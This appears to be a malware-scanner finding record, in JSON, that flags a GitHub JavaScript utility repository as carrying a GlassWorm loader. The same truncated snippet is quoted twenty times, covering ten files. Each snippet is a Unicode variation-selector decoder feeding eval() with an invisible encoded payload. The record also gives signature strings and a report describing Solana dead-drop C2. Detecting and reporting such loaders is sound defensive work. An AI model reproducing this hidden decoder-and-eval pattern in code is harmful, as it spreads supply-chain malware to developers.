@@ -1,0 +1,193 @@
+{
+  "finding": {
+    "key": "repository:sakilanwar12/js-utility-method",
+    "kind": "repository",
+    "family": "",
+    "id": "sakilanwar12/js-utility-method",
+    "url": "https://github.com/sakilanwar12/js-utility-method",
+    "registry": "github",
+    "owner": "sakilanwar12",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 3,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "malware_signature/invisible-unicode-payload; malware_signature/glassworm-ioc",
+    "evidence_locations": "src/string/truncate/truncate.ts:21; src/string/slugify/slugify.ts:37; src/string/removeSpaces/removeSpaces.ts:12; src/string/capitalize/capitalize.ts:11; src/string/camelCase/camelCase.ts:28; src/object/pickKeys/pickKeys.ts:16; src/object/omitKeys/omitKeys.ts:18; src/number/randomInRange/randomInRange.ts:4; src/number/multiply/multiply.ts:11; src/number/isOdd/isOdd.ts:9",
+    "c2_hosts": "",
+    "iocs": "src/string/truncate/truncate.ts",
+    "matched_signatures": "codePointAt 0xFE00 0xE0100 eval; codePointAt 0xFE00 0xE0100 Function",
+    "reasons": "Shares a confirmed-malware code signature ['codePointAt 0xFE00 0xE0100 eval', 'codePointAt 0xFE00 0xE0100 Function'] | Tier-2 confirmed (bash score 3)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261011T214533Z",
+    "last_seen": "hunt-20261011T214533Z",
+    "evidence_file": "repositories/sakilanwar12_js-utility-method.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "src/string/truncate/truncate.ts",
+      "line": 21,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/string/truncate/truncate.ts",
+      "line": 21,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/string/slugify/slugify.ts",
+      "line": 37,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/string/slugify/slugify.ts",
+      "line": 37,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/string/removeSpaces/removeSpaces.ts",
+      "line": 12,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/string/removeSpaces/removeSpaces.ts",
+      "line": 12,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/string/capitalize/capitalize.ts",
+      "line": 11,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/string/capitalize/capitalize.ts",
+      "line": 11,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/string/camelCase/camelCase.ts",
+      "line": 28,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/string/camelCase/camelCase.ts",
+      "line": 28,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/object/pickKeys/pickKeys.ts",
+      "line": 16,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/object/pickKeys/pickKeys.ts",
+      "line": 16,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/object/omitKeys/omitKeys.ts",
+      "line": 18,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/object/omitKeys/omitKeys.ts",
+      "line": 18,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/number/randomInRange/randomInRange.ts",
+      "line": 4,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/number/randomInRange/randomInRange.ts",
+      "line": 4,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/number/multiply/multiply.ts",
+      "line": 11,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/number/multiply/multiply.ts",
+      "line": 11,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/number/isOdd/isOdd.ts",
+      "line": 9,
+      "category": "malware_signature",
+      "rule": "invisible-unicode-payload",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    },
+    {
+      "file": "src/number/isOdd/isOdd.ts",
+      "line": 9,
+      "category": "malware_signature",
+      "rule": "glassworm-ioc",
+      "snippet": "const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙"
+    }
+  ],
+  "commit_sha": "342e0eadc18aa51c7c31a666eea1ae84ce34698d",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/sakilanwar12/js-utility-method",
+    "version_info": "all",
+    "threat_description": "GlassWorm loader (invisible Unicode payload, Solana dead-drop C2). Payload in src/string/truncate/truncate.ts, src/string/slugify/slugify.ts, src/string/removeSpaces/removeSpaces.ts and 7 more files.\nOutbound: documented for this malware family (src/string/truncate/truncate.ts:21).\nThe same dropper is planted in 10 directories.\nFound by GitHub code search for a confirmed malware signature: codePointAt 0xFE00 0xE0100 eval; codePointAt 0xFE00 0xE0100 Function.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: src/string/truncate/truncate.ts, src/string/slugify/slugify.ts, src/string/removeSpaces/removeSpaces.ts, src/string/capitalize/capitalize.ts, src/string/camelCase/camelCase.ts\n- Outbound: documented for this malware family (src/string/truncate/truncate.ts:21).\n- src/string/truncate/truncate.ts:21: long run of invisible Unicode variation selectors: an encoded payload that renders as an empty string (+9 more)\n- src/string/truncate/truncate.ts:21: GlassWorm/ForceMemo fingerprint (variation-selector decoder, Solana dead-drop wallet, ForceMemo marker or C2 address) (+9 more)",
+    "publisher": "sakilanwar12",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "glassworm",
+      "malware"
+    ],
+    "evidence_references": "https://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/string/truncate/truncate.ts#L21\nhttps://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/string/slugify/slugify.ts#L37\nhttps://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/string/removeSpaces/removeSpaces.ts#L12\nhttps://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/string/capitalize/capitalize.ts#L11\nhttps://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/string/camelCase/camelCase.ts#L28\nhttps://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/object/pickKeys/pickKeys.ts#L16\nhttps://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/object/omitKeys/omitKeys.ts#L18\nhttps://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/number/randomInRange/randomInRange.ts#L4\nhttps://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/number/multiply/multiply.ts#L11\nhttps://github.com/sakilanwar12/js-utility-method/blob/342e0eadc18aa51c7c31a666eea1ae84ce34698d/src/number/isOdd/isOdd.ts#L9",
+    "verified_iocs": "src/string/truncate/truncate.ts",
+    "contributors": [],
+    "first_seen": "2026-10-11T21:45:33Z",
+    "last_seen": "2026-10-11T21:45:33Z"
+  }
+}
